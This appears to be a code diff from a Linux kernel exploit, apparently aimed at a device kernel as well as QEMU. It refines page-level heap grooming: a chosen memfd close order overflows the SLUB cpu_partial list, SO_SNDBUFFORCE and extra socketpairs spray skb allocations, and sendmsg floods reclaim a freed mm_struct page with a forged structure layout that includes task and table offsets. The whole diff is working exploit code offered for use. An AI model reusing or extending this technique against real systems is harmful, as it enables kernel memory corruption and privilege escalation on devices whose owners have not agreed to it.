@@ -1342,7 +1342,35 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       }
     }
   }
+  /*
+   * COPYA: duplicate the frag-region structure cluster (chunk-0 at
+   * skb_buf[0xE80..0x1380)) into the linear region [0..0x500). The sends'
+   * kmalloc-4096 linear heads are order-0 claims too — any linear object
+   * landing at base carries the walk geometry at identical base-derived
+   * offsets (lock@+0 table@+0x100 W0@+0x300 task@+0x400).
+   */
+  if (payload_mode == PAGE_PAYLOAD_FOPS && env_flag("COPYA", 1)) {
+    memcpy(skb_buf, skb_buf + 0xE80, 0x500);
+  }
+
   return 1;
+}
+
+
+/* SLABINFO=1: snapshot mm_struct SLUB state at phase boundaries (QEMU has
+ * /proc + /sys; on-device /sys/kernel/slab may be absent — prints skip). */
+static void slab_state_snap(const char *tag) {
+  if (!env_flag("SLABINFO", 0))
+    return;
+  char b[256];
+  read_first_line("/sys/kernel/slab/mm_struct/slabs_cpu_partial", b, sizeof(b));
+  pr_info("SLAB[%s] cpu_partial=%s", tag, b);
+  read_first_line("/sys/kernel/slab/mm_struct/partial", b, sizeof(b));
+  pr_info("SLAB[%s] node_partial=%s", tag, b);
+  read_first_line("/sys/kernel/slab/mm_struct/slabs", b, sizeof(b));
+  pr_info("SLAB[%s] slabs=%s", tag, b);
+  read_first_line("/sys/kernel/slab/mm_struct/objects_partial", b, sizeof(b));
+  pr_info("SLAB[%s] objspartial=%s", tag, b);
 }
 
 uintptr_t prepare_kernel_page(int payload_mode) {
@@ -1431,8 +1459,50 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
-  int sndbuf = env_int_range("SNDBUF_KB", 1024, 64, 16384) * 1024;
+  int sndbuf = env_int_range("SNDBUF_KB", 1024, 64, 65536) * 1024;
   setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+  /*
+   * SO_SNDBUF is clamped to net.core.wmem_max (~208KB stock) — that caps
+   * buffered reclaim sends at ~4. SO_SNDBUFFORCE bypasses the clamp but
+   * needs CAP_NET_ADMIN (QEMU initramfs root ✓, device shell ✗ — on
+   * device use RECLAIM_SOCKETS to aggregate quota instead).
+   */
+  {
+    int actual = 0;
+    socklen_t alen = sizeof(actual);
+    getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &actual, &alen);
+    if (actual < sndbuf) {
+      if (setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf,
+                     sizeof(sndbuf)) == 0) {
+        pr_info("reclaim SO_SNDBUFFORCE=%d ok\n", sndbuf);
+      } else {
+        pr_info("reclaim SO_SNDBUFFORCE failed errno=%d (actual=%d)\n",
+                errno, actual);
+      }
+    }
+  }
+  /*
+   * RECLAIM_SOCKETS: extra socketpairs so total buffered volume and
+   * per-socket page_frag caches multiply; each send goes round-robin.
+   */
+  int reclaim_socks = env_int_range("RECLAIM_SOCKETS", 1, 1, 32);
+  int rsocks[MAX_RECLAIM_SOCKETS];
+  int n_socks = 1;
+  rsocks[0] = reclaim_sv[0];
+  for (int s = 1; s < reclaim_socks && s < MAX_RECLAIM_SOCKETS; s++) {
+    int pair[2];
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, pair) != 0)
+      break;
+    setsockopt(pair[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+    setsockopt(pair[0], SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf,
+               sizeof(sndbuf));
+    int fl = fcntl(pair[0], F_GETFL, 0);
+    if (fl >= 0)
+      fcntl(pair[0], F_SETFL, fl | O_NONBLOCK);
+    rsocks[n_socks++] = pair[0];
+  }
+  if (n_socks > 1)
+    pr_info("reclaim sockets=%d (sndbuf %d each)\n", n_socks, sndbuf);
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
   if (reclaim_flags >= 0) {
     fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
@@ -1474,7 +1544,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   rmsg.msg_iov = &riov;
   rmsg.msg_iovlen = 1;
   int reclaim_sends =
-      env_int_range("RECLAIM_SENDS", SKB_RECLAIM_SENDS, 1, 64);
+      env_int_range("RECLAIM_SENDS", SKB_RECLAIM_SENDS, 1, 1024);
 
   pin_to_core(CORE);
   sched_yield();
@@ -1496,27 +1566,54 @@ uintptr_t prepare_kernel_page(int payload_mode) {
    *     PCP freelist → reclaim send #1 claims it.
    */
 
+  SYSCHK(close(pcp_shaping_sv[0]));
+  SYSCHK(close(pcp_shaping_sv[1]));
+  /*
+   * CLOSE ORDER (QEMU SLUB-measured, cpu_partial=13, node starts 0):
+   * memfd_leak FIRST so base empties before the batch — put_cpu_partial
+   * prepends, so base lands at the chain TAIL (oldest). Then close ALL
+   * pre/post/spray memfds so ≥14 pages empty → the chain overflows →
+   * unfreeze_partials walks head(newest)→tail(base): the 5 newest park on
+   * node partial, everything older is DISCARDED to the buddy — base last
+   * = FRESHEST order-2 free = first split by the order-0 frag storm.
+   * (Old order closed memfd_leak LAST → base was head → parked, never
+   * discarded — the whole placement failure. Shaping socket closes FIRST
+   * so its skb noise precedes the discard.)
+   */
+  SYSCHK(close(memfd_leak));
+  memfd_leak = -1;
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     SYSCHK(close(pre_ctx.memfds[i]));
     pre_ctx.memfds[i] = -1;
   }
-  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
+  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     SYSCHK(close(post_ctx.memfds[i]));
     post_ctx.memfds[i] = -1;
   }
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     SYSCHK(close(spray_ctx.memfds[i]));
     spray_ctx.memfds[i] = -1;
   }
-
-  SYSCHK(close(pcp_shaping_sv[0]));
-  SYSCHK(close(pcp_shaping_sv[1]));
+  /*
+   * +2 distinct prepare pages (children 0 and 16 — different slabs) push
+   * the chain past cpu_partial(13): spill → 5 newest park on node, the
+   * older ~10 DISCARD — base (freed first = chain tail) walks LAST =
+   * freshest order-2 in the buddy. Two exits ≈ 14 order-0 noise pages —
+   * PCP absorbs them ahead of the split, sends cover the rest.
+   */
+  for (int k = 0; k < 6; k++) {
+    size_t idx = (size_t)k * mm_objs_per_slab;
+    if (idx >= prepare_ctx.mm_cnt)
+      break;
+    kill_child(prepare_ctx.childs[idx]);
+    if (prepare_ctx.memfds[idx] >= 0) {
+      SYSCHK(close(prepare_ctx.memfds[idx]));
+      prepare_ctx.memfds[idx] = -1;
+    }
+  }
   sched_yield();
   sched_yield();
-  sched_yield();
-  sched_yield();
-  SYSCHK(close(memfd_leak));
-  memfd_leak = -1;
+  slab_state_snap("after_closes");
 
   int churn_count = env_int_range("MM_CHURN", 0, 0, 1024);
   pid_t *churn_pids = NULL;
@@ -1527,6 +1624,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     pr_info("MM_CHURN forked %d holders (~%d pages)\n", churn_count,
             churn_count / 16);
+    slab_state_snap("after_churn_fork");
   }
   if (churn_pids) {
     for (int i = 0; i < churn_count; i++) {
@@ -1535,6 +1633,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     free(churn_pids);
     churn_pids = NULL;
     pr_info("MM_CHURN killed holders (partial spill → base freshest)\n");
+    slab_state_snap("after_churn_kill");
   }
   /*
    * RECLAIM_DELAY_MS: mm_struct frees are RCU/mmdrop-deferred; if the
@@ -1552,18 +1651,21 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
   for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
-    ssize_t sent = sendmsg(reclaim_sv[0], &rmsg, MSG_DONTWAIT);
+    ssize_t sent = sendmsg(rsocks[i % n_socks], &rmsg, MSG_DONTWAIT);
     if (sent <= 0) {
       break;
     }
   }
+  slab_state_snap("after_sends");
   kernelsnitch_cleanup(ks);
   ks = NULL;
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    SYSCHK(close(prepare_ctx.memfds[i]));
-    prepare_ctx.memfds[i] = -1;
-    kill_child(prepare_ctx.childs[i]);
+    if (prepare_ctx.memfds[i] >= 0) {
+      SYSCHK(close(prepare_ctx.memfds[i]));
+      prepare_ctx.memfds[i] = -1;
+      kill_child(prepare_ctx.childs[i]);
+    }
   }
 
   return base;
